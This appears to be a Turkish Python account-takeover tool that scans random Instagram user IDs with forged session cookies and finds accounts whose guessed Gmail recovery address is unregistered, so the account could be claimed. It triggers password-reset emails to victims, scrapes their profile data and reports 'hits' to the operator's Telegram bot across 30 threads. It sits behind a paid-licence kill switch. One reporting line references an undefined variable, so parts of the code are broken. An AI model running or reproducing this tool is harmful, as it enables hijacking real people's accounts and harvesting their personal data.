import requests
import sys
import time
import os
import re
import json
import string
import random
import hashlib
import uuid
from datetime import datetime
from threading import Thread, Timer
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init

# API Durum Kontrol
API_URL = "https://raw.githubusercontent.com/BatuTeam28/lisanskontrol/main/durum.txt"

def api_kontrol():
    try:
        response = requests.get(API_URL, timeout=5)
        durum = response.text.strip().upper()
        if durum == "KAPALI":
            print("\n🔒 [×] SÜRELİ APİ KAPALI!")
            print("🚫 SÜRESİZ APİ İÇİN DM BUY 👉 @BatuX28")
            sys.exit()
        elif durum == "ACIK":
            print("\n🔓 [✓] SÜREKLİ API AÇIK ")
            print("🔄 LÜTFEN BEKLEYİN...\n")
            time.sleep(2)
        else:
            print("\n[!] Hatalı API durumu. GitHub 'durum.txt' dosyasını kontrol et!")
            sys.exit()
    except Exception as e:
        print(f"\n[×] API kontrol edilemedi. Hata: {e}")
        sys.exit()

api_kontrol()


import os
import requests
import time
import re
import random
import string
from cfonts import render
import json
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
from uuid import uuid4
import instaloader
from random import choice,randrange
from user_agent import generate_user_agent
import threading
import webbrowser
os.system('clear')
logo = render('''BATU         NEW       TOOL''', font='block', colors=['blue', 'white'], align='center', space=True)
print("═" * 50 + "\033[0m")
print(logo)
print("""      🌐𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @BatuX28   📡 𝐊𝐀𝐍𝐀𝐋 : @BatuPython28""")

print("═" * 50 + "\033[0m")
TELEGRAM_BOT_TOKEN = input("\x1b[1;32m𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫 : \x1b[1;33m")
print("═" * 47 + "\033[0m")
TELEGRAM_CHAT_ID = input("\x1b[1;32m𝙞𝐝 𝐆𝐢𝐫 : \x1b[1;33m")
takipcisec = int(input("𝙈𝙞𝙣𝙞𝙢𝙪𝙣 𝙏𝙖𝙠𝙞𝙥𝙘𝙞 𝙂𝙞𝙧𝙚𝙧𝙢𝙞𝙨𝙞𝙣 : "))

time.sleep(1.5)
os.system("clear")

hit_ig = 0
iyi_ig = 0
bad_ig = 0
bad_gm = 0
toplam = 0
checked_users = []




def telegrama_mesaj_gonder(mesaj):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': mesaj
    }
    requests.post(url, data=data)

def date(Id):
    try:
        Id = int(Id)
        if 1 < Id < 1279000:
            return 2010
        elif 1279001 <= Id < 17750000:
            return 2011
        elif 17750001 <= Id < 279760000:
            return 2012
        elif 279760001 <= Id < 900990000:
            return 2013
        elif 900990001 <= Id < 1629010000:
            return 2014
        elif 1900000000 <= Id < 2500000000:
            return 2015
        elif 2500000000 <= Id < 3713668786:
            return 2016
        elif 3713668786 <= Id < 5699785217:
            return 2017
        elif 5699785217 <= Id < 8507940634:
            return 2018
        elif 8507940634 <= Id < 21254029834:
            return 2019
        else:
            return "2020-2023"
    except Exception:
        return "Bilinmiyor"

def instagram_bilgi_cek(user_id, email):
    try:
        csrf_token = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))
        datr = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
        session_id = f"{user_id}%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))}%3A28%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(24))}"

        cookies = {
            'datr': datr,
            'csrftoken': csrf_token,
            'ds_user_id': user_id,
            'sessionid': session_id
        }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/explore/search/',
            'user-agent': generate_user_agent(),
            'x-csrftoken': csrf_token,
            'x-ig-app-id': '1217981644879628',
        }

        data = {
            'variables': json.dumps({"id": user_id, "render_surface": "PROFILE"}),
            'doc_id': '9383802848352200',
        }

        response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data)
        user = response.json()["data"]["user"]
        username = user["username"]
        full_name = user.get("full_name", "Yok")
        biography = user.get("biography", "Yok")
        profile_pic = user.get("profile_pic_url", "")
        follower = user.get("follower_count", 0)
        following = user.get("following_count", 0)
        posts = user.get("media_count", 0)

        
        rest_headers = {
            'User-Agent': 'Instagram 100.0.0.17.129 Android',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        }
        rest_data = {
            'signed_body': f'XXX.{{"_csrftoken":"csrftoken","query":"{username}"}}',
            'ig_sig_key_version': '4',
        }
        reset = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=rest_headers, data=rest_data).json().get("email", "Bilinmiyor")

        mesaj = f"""
𓊆 𝐈𝐧𝐬𝐭𝐚 𝐇𝐢𝐭 𝐃ü𝐬𝐭ü 𝐁𝐫ø 𓊇
──────────────────────
🔥 𝐇𝐈𝐓 : {aca}
🛐 𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈 : @{username}
📛 𝐀𝐃 : {full_name}
📧 𝐄𝐌𝐀İ𝐋 : {email}
📨 𝐑𝐄𝐒𝐄𝐓 : {reset}
📆 𝐊𝐔𝐑𝐔𝐋𝐔𝐌 : {date(user_id)}
🆔 𝐈𝐃 : {user_id}
👥 𝐓𝐀𝐊İ𝐏Çİ : {follower}
➕ 𝐓𝐀𝐊İ𝐏 : {following}
🖼️ 𝐆Ö𝐍𝐃𝐄𝐑İ : {posts}
✏️ 𝐁İ𝐎 : {biography}
🖼️ 𝐏𝐑𝐎𝐅İL 𝐑𝐄𝐒Mİ : {profile_pic}
📡 𝐊𝐀𝐍𝐀𝐋 : @BatuPython28
──────────────────────
🌐 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @BatuX28 ~ @BatuKumar_Bot ~ @BatuPython28
"""
        print(mesaj)
        telegrama_mesaj_gonder(mesaj)

    except Exception as e:
        print(f"[HATA] Kullanıcı ID: {user_id}, Email: {email}")
        print(f"[DETAY] {e}")
        time.sleep(10)

def list_cek():
    while True:
        user_id = str(random.randrange(1,21254029834))
        csrf_token = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))
        datr = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
        session_id = f"{user_id}%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))}%3A28%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(24))}"
        cookies = {
            'datr': datr,
            'csrftoken': csrf_token,
            'ds_user_id': user_id,
            'sessionid': session_id
        }
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/explore/search/',
            'user-agent': generate_user_agent(),
            'x-csrftoken': csrf_token,
            'x-ig-app-id': '1217981644879628',
        }
        data = {
            'variables': json.dumps({"id": user_id, "render_surface": "PROFILE"}),
            'doc_id': '9383802848352200',
        }
        try:
            response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data)
            user_data = response.json()['data']['user']
            username = user_data['username']
            follower = user_data.get("follower_count", 0)
            if "username" in response.text:
                return {"email": username, "user_id": user_id, "followers": follower}
        except Exception as e:
            pass
            
            
def check_ig(email):
	cookies = {
	'csrftoken':'X2my0jz_gM8Fx0AFuTnDUA',
	'dpr':'2.75',
	'datr':'izhAZ-wDTHDpFTMZgOD8qLjH',
	'ig_did':'55A1ED1E-32F8-4AE3-9938-7C60526941D6',
	'mid':'Z0A4iwABAAHexmqymQnKLZLEn6A7',
	'wd':'393x767'
	}
	headers = {
	'content-type':'application/x-www-form-urlencoded',
	'origin':'https://www.instagram.com',
	'referer':'https://www.instagram.com/accounts/password/reset/?source=fxcal',
	'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	'x-csrftoken':'X2my0jz_gM8Fx0AFuTnDUA'
	}
	data = {
	'email_or_username':email,
	'flow':'fxcal'
	}
	response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', data=data, headers=headers, cookies=cookies)
	if '"email_or_sms_sent":true' in response.text:
		return True
	else:
		return False
def check_gm(email):
	try:
		n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
		n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
		host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
		headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
		res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
		tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
		cookies={'__Host-GAPS':host}
		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
		data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
		response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
		tl=str(response.text).split('",null,"')[1].split('"')[0]
		host=response.cookies.get_dict()['__Host-GAPS']
		if'@'in email:email=str(email).split('@')[0]
		cookies={'__Host-GAPS':host}
		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
		params={'TL':tl}
		data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
		response=requests.post('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if '"gf.uar",1'in response.text:
			return True
		elif '"gf.uar",2'in response.text or '"gf.uar",3' in response.text:
			return False
		else:
			return False
	except:
		return False      	
def weoxarayuz(email):
    os.system("clear")
    print("═" * 47 + "\033[0m")

    print(f'''
\033[1;32m[✓] HİT : {hit_ig} 
\033[1;33m[!] GOOD İG : {iyi_ig} 
\033[1;31m[✗] BAD İG : {bad_ig}  
\033[1;31m[✗] BAD GM : {bad_gm}
\033[1;32m[✓] TOPLAM BAD : {toplam}       
\033[1;36m[@] EMAIL : {email}     
''')

    print("\033[1;97m" + "═" * 47 + "\033[0m")	

def main():
    global hit_ig, iyi_ig, bad_ig, bad_gm, toplam
    while True:
        try:
            result = list_cek()
            username = result['email']
            user_id = result['user_id']            
            follower_count = result['followers']
            if follower_count < takipcisec:
            	continue 
            
            if username in checked_users:
                continue
            checked_users.append(username)
                
            email = username + "@gmail.com"
            #email2 = username + "@hotmail.com"
            chk_ig = check_ig(email)           
            if chk_ig:
                toplam += 1
                iyi_ig += 1
                weoxarayuz(email)                
                chk_gm = check_gm(email)
                if chk_gm:
                    toplam += 1
                    hit_ig += 1
                    weoxarayuz(email)
                    instagram_bilgi_cek(user_id, email)
                else:
                    bad_gm += 1
                    toplam += 1
                    weoxarayuz(email)
            else:
                bad_ig += 1
                toplam += 1
                weoxarayuz(email)                
        except Exception as weoxst:
            pass
for weoxst in range(30):
    threading.Thread(target=main).start()
